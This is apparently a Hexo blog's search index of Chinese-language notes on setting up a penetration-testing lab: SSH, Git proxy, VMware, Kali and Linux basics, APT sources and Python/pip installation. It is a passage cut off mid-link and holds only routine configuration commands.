<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SSH</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/SSH/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/SSH/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h1><p>SSH简介：SSH 为 Secure Shell 的缩写，SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SSH配置：开启密码登录、允许root用户登录：</span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">#PermitRootLogin prohibit-password</span><br><span class="line">PermitRootLogin yes</span><br><span class="line"></span><br><span class="line">开启或重启ssh：（改完配置文件都要重启相应服务）</span><br><span class="line">service ssh start</span><br><span class="line">service ssh restart</span><br><span class="line">systemctl status ssh命令查看ssh状态</span><br><span class="line">systemctl start ssh开启ssh服务</span><br><span class="line"></span><br><span class="line">查看22端口是否开启监听：</span><br><span class="line">netstat -anltup | grep 22</span><br><span class="line"></span><br><span class="line">添加开机启动：</span><br><span class="line">systemctl enable ssh</span><br><span class="line">update-rc.d ssh enable</span><br><span class="line"></span><br><span class="line">终端连接：</span><br><span class="line">ifconfig</span><br><span class="line">ssh root@192.168.123.136</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Git/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Git/</url>
      
        <content type="html"><![CDATA[<p>Git简介：一个开源的分布式版本控制系，用于敏捷高效地处理任何或小或大的项目。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#克隆</span><br><span class="line">git clone https://github.com/Hack-with-Github/Awesome-Hacking.git</span><br><span class="line">#Git socks代理</span><br><span class="line">#前提是你本地有 socks5 代理，本地socks开启局域网连接</span><br><span class="line">git config --global http.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git config --global https.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git clone https://github.com/shmilylty/OneForAll.git</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li>Git教程:<a href="https://www.runoob.com/git/git-tutorial.html">https://www.runoob.com/git/git-tutorial.html</a></li></ul></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmware使用</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/vmware%E4%BD%BF%E7%94%A8/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/vmware%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="vmware虚拟网卡的解释"><a href="#vmware虚拟网卡的解释" class="headerlink" title="vmware虚拟网卡的解释"></a>vmware虚拟网卡的解释</h1><p>为什么windows主机可以访问内网的网站呢，为什么可以ping通Ubuntu和win7呢，因为在VM里创建虚拟网卡的时候，在Windows上面也创建了虚拟网卡，通过<code>IPconfig /all</code>命令，可以看得到。如果不想让主机访问到内网，可以在设置里面禁用虚拟网卡或者设置防火墙：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181001851.png" alt="image-20220818095458787" style="zoom:50%;" />]]></content>
      
      
      
        <tags>
            
            <tag> wmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux使用基础</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali/Linux%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali/Linux%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux简介"><a href="#Linux简介" class="headerlink" title="Linux简介"></a>Linux简介</h1><p>Kali Linux是基于debian的发行版。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180940750.png" alt="image-20220818094012557" style="zoom:50%;" /><h1 id="Linux目录结构"><a href="#Linux目录结构" class="headerlink" title="Linux目录结构"></a>Linux目录结构</h1><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180940707.png" alt="image-20220818094044556" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/：根目录，每一个文件和目录都从这里开始。只有root用户具有该目录下的写权限。</span><br><span class="line">/bin：用户二进制文件，包含二进制可执行文件。系统的所有用户使用的命令都设在这里，例如：ps，ls，ping，grep，cp等。</span><br><span class="line">/boot：这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。</span><br><span class="line">/dev ：设备文件，dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。</span><br><span class="line">/etc：这个目录用来存放所有的系统管理所需要的配置文件和子目录。</span><br><span class="line">/home：用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。</span><br><span class="line">/lib：这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。</span><br><span class="line">/opt：可选的附加应用程序，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库就可以放到这个目录下。默认是空的。</span><br><span class="line">/root：该目录为系统管理员，也称作超级权限者的用户主目录。</span><br><span class="line">/sbin：s就是Super User的意思，系统二进制文件，在这个目录下的linux命令通常由系统管理员使用。</span><br><span class="line">/usr：这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。</span><br><span class="line">/usr/bin：系统用户使用的应用程序。</span><br><span class="line">/usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序。</span><br><span class="line">/tmp：这个目录是用来存放一些临时文件的。</span><br><span class="line">/var：这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</span><br></pre></td></tr></table></figure><h1 id="Linux文件属性"><a href="#Linux文件属性" class="headerlink" title="Linux文件属性"></a>Linux文件属性</h1><blockquote><p><a href="https://m.runoob.com/linux/linux-comm-chown.html">chown命令</a></p></blockquote><p>用ll命令列出来所有文件的权限，一般而言，你是什么用户创建的文件，其文件所属用户就对应于对应用户</p><p>kali里面的权限控制及其细分，注意组的权限和个人权限，即使文件没有个人权限，如果所属组有权限，那么也是可以执行的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r：4</span><br><span class="line">w：2</span><br><span class="line">x：1</span><br><span class="line">属主：u（user）</span><br><span class="line">数组：g（group）</span><br><span class="line">其他：o（other）</span><br><span class="line"><span class="built_in">chmod</span> u+x <span class="built_in">test</span>                        <span class="comment">#chmod    change mode</span></span><br><span class="line"><span class="built_in">chown</span> root.root <span class="built_in">test</span>                  <span class="comment">#chown    change owner    root，root前面的是用户，后面的是组</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">    -rw-r--r--  1 kali kali 11759  2月 23 05:36 .face</span><br><span class="line">    lrwxrwxrwx  1 kali kali     5  2月 23 05:36 .face.icon -&gt; .face</span><br><span class="line">    drwx------  3 kali kali  4096  3月 31 06:00 .gnupg</span><br><span class="line">-开头表示这是一个文件</span><br><span class="line">l开头表示这是一个链接</span><br><span class="line">d开头表示这是一个目录</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180947778.png" alt="image-20220818094710630" style="zoom:50%;" /><h1 id="Kali配置"><a href="#Kali配置" class="headerlink" title="Kali配置"></a>Kali配置</h1><h2 id="用户配置"><a href="#用户配置" class="headerlink" title="用户配置"></a>用户配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo su</span><br><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><h2 id="linux网络配置文件详解-设置固定IP）"><a href="#linux网络配置文件详解-设置固定IP）" class="headerlink" title="linux网络配置文件详解(设置固定IP）"></a>linux网络配置文件详解(设置固定IP）</h2><p>如果不想通过DHCP随机分配ip地址（当IP租期一过就会重新分配），就需要通过修改网络配置文件，改为固定的IP，文件所在目录如下：</p><p>&#x3D;&#x3D;&gt;centos的网络配置文件在<code>/etc/sysconfig/network-scripts</code>目录下</p><p>&#x3D;&#x3D;&gt;ubuntu的网络配置文件在<code>/etc/network</code>目录下</p><blockquote><p><a href="https://www.cnblogs.com/ArthurYu/p/13908934.html">https://www.cnblogs.com/ArthurYu/p/13908934.html</a></p><p><a href="https://blog.csdn.net/weixin_42476945/article/details/104164056">https://blog.csdn.net/weixin_42476945/article/details/104164056</a></p></blockquote><h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置文件位置：/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">1. DEVICE=eth0 网卡的名字</span><br><span class="line">2. HWADDR=00:0c:29:90:89:d9 HWADDR HardWare Address 硬件地址 MAC地址</span><br><span class="line">3. TYPE=Ethernet 网络类型 以太网</span><br><span class="line">4. UUID=ae779ae6-044d-43d5-a33b-48c89e8de10e #UUID 做到系统中独一无二。</span><br><span class="line">5. ONBOOT=yes BOOT ON ? 在开机或重启网卡的时候是否启动网卡</span><br><span class="line">6. NM_CONTROLLED=yes 是否受network程序管理</span><br><span class="line">7. BOOTPROTO=none 网卡是如何获取到ip地址 网卡获取ip地址的方式</span><br><span class="line">　　a. dhcp 自动获取ip地址</span><br><span class="line">　　b. none 固定的ip地址</span><br><span class="line">　　c. static 固定的ip地址</span><br><span class="line">8. IPADDR=10.0.0.100 IPADDR ip地址</span><br><span class="line">9. NETMASK=255.255.255.0 子网掩码 决定这个局域网中最多有多少台机器</span><br><span class="line">10. GATEWAY=10.0.0.2 网关 整个大楼的大门</span><br><span class="line">11. USERCTL=no 普通用户是否能控制网卡</span><br><span class="line">12. /etc/resolv.conf 配置DNS 网卡配置文件的DNS优先于/etc/resolv.conf</span><br><span class="line">13. DNS 域名解析器 阿里的域名解析器：223.5.5.5 223.6.6.6</span><br><span class="line"></span><br><span class="line">重启网卡命令： /etc/init.d/network restart</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">HWADDR=00:0c:29:2d:d7:44</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">IPADDR=192.168.22.11</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.22.1</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens37</span><br><span class="line">UUID=a18a03de-36a2-36a2-8514-0232129b08b0</span><br><span class="line">ONBOOT=yes</span><br><span class="line">AUTOCONNECT_PRIORITY=-999</span><br></pre></td></tr></table></figure><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置IP：/etc/network/interfaces</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.1.228</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.1.1</span><br><span class="line"></span><br><span class="line">配置DNS：</span><br><span class="line">/etc/resolv.conf</span><br><span class="line">重启服务</span><br><span class="line">service networking restart</span><br><span class="line">service network-manager restart</span><br><span class="line">自动获取IP(在固定IP模式下不生效）：dhclient</span><br><span class="line">启动网卡:ifconfig eth0 up</span><br></pre></td></tr></table></figure><p>- </p><h2 id="设置APT源"><a href="#设置APT源" class="headerlink" title="设置APT源"></a>设置APT源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line">vim /etc/apt/sources.list</span><br><span class="line">apt-get update</span><br><span class="line">apt-get clean</span><br><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="comment">#阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><h2 id="APT使用"><a href="#APT使用" class="headerlink" title="APT使用"></a>APT使用</h2><h3 id="apt-get-amp-apt"><a href="#apt-get-amp-apt" class="headerlink" title="apt-get &amp; apt"></a>apt-get &amp; apt</h3><p>apt-get  可以从认证软件源下载软件包及相关信息，以便安装和升级软件包，或者用于移除软件包。在这些过程中，软件包依赖会被妥善处理。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update - 取回更新的软件包列表信息</span><br><span class="line">upgrade - 进行一次升级</span><br><span class="line">install - 安装新的软件包(注：软件包名称是 libc6 而非libc6.deb)</span><br><span class="line">reinstall - Reinstall packages (pkg is libc6 not libc6.deb)</span><br><span class="line">remove - 卸载软件包</span><br></pre></td></tr></table></figure><h3 id="apt-与-apt-get的区别与解释"><a href="#apt-与-apt-get的区别与解释" class="headerlink" title="apt 与 apt-get的区别与解释"></a>apt 与 apt-get的区别与解释</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简单来说就是：apt = apt-get、apt-cache 和 apt-config 中最常用命令选项的集合。</span><br></pre></td></tr></table></figure><ul><li>虽然 apt  与 apt-get  有一些类似的命令选项，但它并不能完全向下兼容 apt-get  命令。也就是说，可以用 apt  替换部分 apt-get  系列命令，但不是全部。</li><li>apt  可以看作 apt-get  和 apt-cache  命令的子集, 可以为包管理提供必要的命令选项。</li><li>apt-get  虽然没被弃用，但作为普通用户，还是应该首先使用 apt 。</li></ul><table><thead><tr><th align="center">apt 命令</th><th align="center">取代的命令</th><th align="center">命令的功能</th></tr></thead><tbody><tr><td align="center">apt install</td><td align="center">apt-get install</td><td align="center">安装软件包</td></tr><tr><td align="center">apt remove</td><td align="center">apt-get remove</td><td align="center">移除软件包</td></tr><tr><td align="center">apt purge</td><td align="center">apt-get purge</td><td align="center">移除软件包及配置文件</td></tr><tr><td align="center">apt update</td><td align="center">apt-get update</td><td align="center">刷新存储库索引</td></tr><tr><td align="center">apt upgrade</td><td align="center">apt-get upgrade</td><td align="center">升级所有可升级的软件包</td></tr><tr><td align="center">apt autoremove</td><td align="center">apt-get autoremove</td><td align="center">自动删除不需要的包</td></tr><tr><td align="center">apt full-upgrade</td><td align="center">apt-get dist-upgrade</td><td align="center">在升级软件包时自动处理依赖关系</td></tr><tr><td align="center">apt search</td><td align="center">apt-cache search</td><td align="center">搜索应用程序</td></tr><tr><td align="center">apt show</td><td align="center">apt-cache show</td><td align="center">显示装细节</td></tr></tbody></table><p>当然，apt 还有一些自己的命令：</p><table><thead><tr><th align="center">新的apt命令</th><th align="center">命令的功能</th></tr></thead><tbody><tr><td align="center">apt list</td><td align="center">列出包含条件的包（已安装，可升级等）</td></tr><tr><td align="center">apt edit-sources</td><td align="center">编辑源列表</td></tr></tbody></table><p>需要大家注意的是：apt 命令也还在不断发展， 因此，你可能会在将来的版本中看到新的选项。</p><blockquote><p><a href="https://www.sysgeek.cn/apt-vs-apt-get/">Linux中apt与apt-get命令的区别与解释</a></p></blockquote><h2 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a>设置中文</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装中文字体</span></span><br><span class="line">apt-get install xfonts-intl-chinese</span><br><span class="line">apt-get install ttf-wqy-microhei</span><br><span class="line"><span class="comment">#设置语言</span></span><br><span class="line">dpkg-reconfigure locales</span><br><span class="line"><span class="comment">#进入图形界面，选中 en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8 并将 zh_CN.UTF-8 选为默认。（空格是选择，tab是切换， * 是选中）</span></span><br><span class="line">重启</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><strong>Kali工具</strong>:</p><ul><li><a href="https://tools.kali.org/tools-listing">https://tools.kali.org/tools-listing</a></li><li><a href="https://github.com/Jack-Liang/kalitools">https://github.com/Jack-Liang/kalitools</a></li></ul></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Kali配置与使用</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali/Linux-Kali%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali/Linux-Kali%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>建议虚拟机搞kali~</p><h1 id="VMware安装"><a href="#VMware安装" class="headerlink" title="VMware安装"></a>VMware安装</h1><ol><li>通过scoop进行安装</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、安装软件镜像包源 scoop bucket add scoopet https://github.com/ivaquero/scoopet.git</span><br><span class="line">2、通过搜索 scoop search vmware</span><br><span class="line">3、进行下载安装 scoop install vmware-workstation-pro</span><br></pre></td></tr></table></figure><ol start="2"><li>下载vmware</li></ol><blockquote><p>Vmware官网：<a href="https://www.vmware.com/">https://www.vmware.com/</a></p></blockquote><ol start="3"><li>激活vmware</li></ol><h1 id="Kali简介"><a href="#Kali简介" class="headerlink" title="Kali简介"></a>Kali简介</h1><blockquote><p><a href="https://www.kali.org/docs/introduction/what-is-kali-linux/">https://www.kali.org/docs/introduction/what-is-kali-linux/</a></p></blockquote><h2 id="Kali下载"><a href="#Kali下载" class="headerlink" title="Kali下载"></a>Kali下载</h2><blockquote><p>Kali官网下载：</p><p>Get Kali | Kali Linux：<a href="https://www.kali.org/get-kali/">https://www.kali.org/get-kali/</a></p><p><a href="https://kali.download/virtual-images/kali-2022.1/kali-linux-2022.1-vmware-amd64.7z">https://kali.download/virtual-images/kali-2022.1/kali-linux-2022.1-vmware-amd64.7z</a></p></blockquote><h1 id="Vmware安装Kali"><a href="#Vmware安装Kali" class="headerlink" title="Vmware安装Kali"></a>Vmware安装Kali</h1><p>解压下载的压缩包 kali-linux-2022.1-vmware-amd64.7z , 双击打开下.vmx 文件</p><p>点击 开启此虚拟机 ，即可启动。</p><p>系统已经配置好默认普通用户 kali ，默认密码 kali </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python环境安装</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Python%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Python%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows安装Python2-x2F-3"><a href="#Windows安装Python2-x2F-3" class="headerlink" title="Windows安装Python2&#x2F;3"></a>Windows安装Python2&#x2F;3</h1><h2 id="通过scoop安装"><a href="#通过scoop安装" class="headerlink" title="通过scoop安装"></a>通过scoop安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、添加versions镜像源 scoop bucket add versions</span><br><span class="line">2、通过命令进行搜索 scoop search python</span><br><span class="line">3、选定对应的python版本进行安装</span><br><span class="line">scoop install python27</span><br><span class="line">scoop install python</span><br></pre></td></tr></table></figure><h2 id="Python官网下载安装"><a href="#Python官网下载安装" class="headerlink" title="Python官网下载安装"></a>Python官网下载安装</h2><h3 id="下载安装程序："><a href="#下载安装程序：" class="headerlink" title="下载安装程序："></a>下载安装程序：</h3><blockquote><p><a href="https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe">https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe</a></p><p><a href="https://www.python.org/downloads/release/python-377/">https://www.python.org/downloads/release/python-377/</a></p></blockquote><p>Customize installation：自定义安装pip、IDLE、安装路径等</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180111556.png" alt="image-20220818011126154" style="zoom:50%;" /><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><ol><li>点击此电脑选择高级系统设置，在选择环境变量</li><li>找到path</li><li>添加python的安装路径到此处即可</li><li>添加pip的环境变量，同理，pip在python的scripts目录下及添加到path中即可</li></ol><h3 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h3><ol><li>使用windows+R键，打开cmd输入python显示出python版本既配置成功</li><li>pip配置是否成功。输入pip3 看是否提示出帮助信息。</li></ol><h1 id="Linux安装Python2-x2F-3"><a href="#Linux安装Python2-x2F-3" class="headerlink" title="Linux安装Python2&#x2F;3"></a>Linux安装Python2&#x2F;3</h1><h2 id="一些注意事项："><a href="#一些注意事项：" class="headerlink" title="一些注意事项："></a>一些注意事项：</h2><p>在linux中存在多个版本python，这个时候，我们如果想在指定版本的目录里安装相应的模块，应该是使用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install --target=目标路径  工具包名字</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://blog.csdn.net/qq_33547191/article/details/86552214">https://blog.csdn.net/qq_33547191/article/details/86552214</a></p></blockquote><h2 id="安装Python2"><a href="#安装Python2" class="headerlink" title="安装Python2"></a>安装Python2</h2><p>一般Linux系统默认安装Python2.7，因此无需额外安装</p><h2 id="安装Python3"><a href="#安装Python3" class="headerlink" title="安装Python3"></a>安装Python3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /usr/local/python3</span><br><span class="line">yum -y install wget gcc libffi-devel</span><br><span class="line">wget https://www.python.org/ftp/python/3.7.7/Python-3.7.7.tgz</span><br><span class="line">tar -zxf Python-3.7.7.tgz</span><br><span class="line"><span class="built_in">cd</span> Python-3.7.7</span><br><span class="line">./configure --prefix=/usr/local/python3</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>修改PATH环境变量</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/local/python3/bin/python3 /usr/bin/python3</span><br><span class="line">yum –y install python3-pip</span><br><span class="line">将/usr/local/python3/bin加入PATH：</span><br><span class="line">vim /etc/profile</span><br><span class="line">PATH=<span class="variable">$PATH</span>:/usr/local/python3/bin</span><br></pre></td></tr></table></figure><p>python3默认版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/profile.d/python.sh           <span class="comment">#编辑用户自定义配置，输入alias参数</span></span><br><span class="line"><span class="built_in">alias</span> python=<span class="string">&#x27;/usr/local/bin/python3.8&#x27;</span>    <span class="comment">#这里写你的python路径</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/python.sh         <span class="comment">#重启会话使配置生效</span></span><br></pre></td></tr></table></figure><h1 id="Mac安装Python2-x2F-3"><a href="#Mac安装Python2-x2F-3" class="headerlink" title="Mac安装Python2&#x2F;3"></a>Mac安装Python2&#x2F;3</h1><p>系统默认安装Python2.7，因此无需额外安装</p><h2 id="安装Python3-1"><a href="#安装Python3-1" class="headerlink" title="安装Python3"></a>安装Python3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install python3</span><br></pre></td></tr></table></figure><h2 id="不同版本Python路径"><a href="#不同版本Python路径" class="headerlink" title="不同版本Python路径"></a>不同版本Python路径</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统默认(2.7)：</span><br><span class="line">/System/Library/Frameworks/Python.framework/Versions/2.7</span><br><span class="line">brew安装(2.7/3.x)：</span><br><span class="line">/usr/local/Cellar/python</span><br><span class="line">官网pkg安装(3.x)</span><br><span class="line">/Library/Frameworks/Python.framework/Versions/3.x</span><br></pre></td></tr></table></figure><h2 id="配置Python2和Python3"><a href="#配置Python2和Python3" class="headerlink" title="配置Python2和Python3"></a>配置Python2和Python3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim ~/.bash_profile</span><br><span class="line"># Setting PATH for Python 2.7</span><br><span class="line">PATH=&quot;/System/Library/Frameworks/Python.framework/Versions/2.7/bin:$&#123;PATH&#125;&quot;</span><br><span class="line">export PATH</span><br><span class="line"># Setting PATH for Python 3.x</span><br><span class="line">PATH=&quot;/usr/local/Cellar/python/3.x/bin:$&#123;PATH&#125;&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line">alias python2=&#x27;/System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7&#x27;</span><br><span class="line">alias python3=&#x27;/usr/local/Cellar/python/3.x/bin/python3.x&#x27;</span><br><span class="line">source ~/.bash_profile</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h1 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h1><h2 id="pip简介"><a href="#pip简介" class="headerlink" title="pip简介"></a>pip简介</h2><p>pip 是一个 Python 包安装与管理工具。Kali2022 默认安装 python2.7 和 python3. 9 ，但需自行配置 pip</p><p>python pip各版本的安装，最好用脚本下载，</p><h2 id="apt安装方式"><a href="#apt安装方式" class="headerlink" title="apt安装方式"></a>apt安装方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install python3-pip </span><br><span class="line">apt install python-pip</span><br></pre></td></tr></table></figure><h2 id="脚本下载安装方式"><a href="#脚本下载安装方式" class="headerlink" title="脚本下载安装方式"></a>脚本下载安装方式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pip3 清华源下载</span></span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py   </span><br><span class="line">python get-pip.py -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br><span class="line"></span><br><span class="line"><span class="comment">#pip2：</span></span><br><span class="line">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip2.py</span><br><span class="line">python2 get-pip2.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#pip3：</span></span><br><span class="line">curl https://bootstrap.pypa.io/get-pip.py -o get-pip3.py</span><br><span class="line">python3 get-pip3.py &amp; pip3 list</span><br></pre></td></tr></table></figure><h2 id="pip安装-Python-库"><a href="#pip安装-Python-库" class="headerlink" title="pip安装 Python 库"></a>pip安装 Python 库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip3 install pwntools</span><br><span class="line">pip使用国内代理：</span><br><span class="line">pip3 install -r requirements.txt -i https://mirrors.ustc.edu.cn/pypi/web/simple</span><br></pre></td></tr></table></figure><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul><li>python site-packages目录：</li></ul><p>python第三方包都安装到了site-packages目录下了。 我们可以通过下面的python代码来找到它的位置：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.path.dirname(os.__file__)</span><br></pre></td></tr></table></figure><ul><li>python安装第三方包的安装路径，dist-packages和site-packages区别：</li></ul><p>简单来说便是，如果是系统自带的python，会使用dist-packages目录；如果你手动安装python，它会直接使用目录site-packages。</p><blockquote><p>参考：<a href="https://blog.csdn.net/cc1949/article/details/78286224">https://blog.csdn.net/cc1949/article/details/78286224</a></p></blockquote><ul><li>pip、pip2和pip3区别：</li></ul><p>pip和pip2相同，均对应Python2.x版本。pip3对应Python3.x版本。</p><p>对应版本下载对应版本的模块</p><blockquote><p>参考：<a 